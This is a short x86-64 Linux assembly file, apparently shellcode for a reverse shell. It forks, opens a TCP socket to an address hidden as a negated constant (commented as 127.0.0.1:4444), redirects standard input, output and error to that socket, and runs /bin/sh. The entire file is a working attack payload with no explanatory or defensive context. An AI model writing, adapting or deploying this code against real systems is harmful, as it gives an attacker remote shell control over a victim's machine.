.text

.globl _start

_start:

    # vfork
    xorq %rax, %rax
    movq $58, %rax
    syscall
    cmp $0, %eax;
    jz _exec
    int3

_exec:
    # socket
    xorq %rax, %rax
    movq $41, %rax      # socket syscall 41
    movq $2, %rdi       # AF_INET 2
    movq $1, %rsi       # SOCK_STREAM 1
    movq $0, %rdx       # protocol 0
    syscall             # socket(AF_INET, SOCK_STREAM, 0)

    # connect
    movq %rax, %rdi
    xorq %rax, %rax     
    movq $42, %rax
    movq $0xfeffff80a3eefffe, %rcx          # 127.0.0.1:4444
    neg %rcx
    pushq %rcx
    pushq %rsp
    popq %rsi
    movq $16, %rdx
    syscall

    # dup2
    xorq %rax, %rax
    movq $33, %rax
    movq $0, %rsi
    syscall

    xorq %rax, %rax
    movq $33, %rax
    movq $1, %rsi
    syscall

    xorq %rax, %rax
    movq $33, %rax
    movq $2, %rsi
    syscall

    # execve
    xorq %rax, %rax
    movq $59, %rax
    movq $0x68732f6e69622f, %rcx          # /bin/sh
    pushq %rcx
    pushq %rsp
    pop %rdi
    movq $0, %rsi
    movq $0, %rdx
    syscall
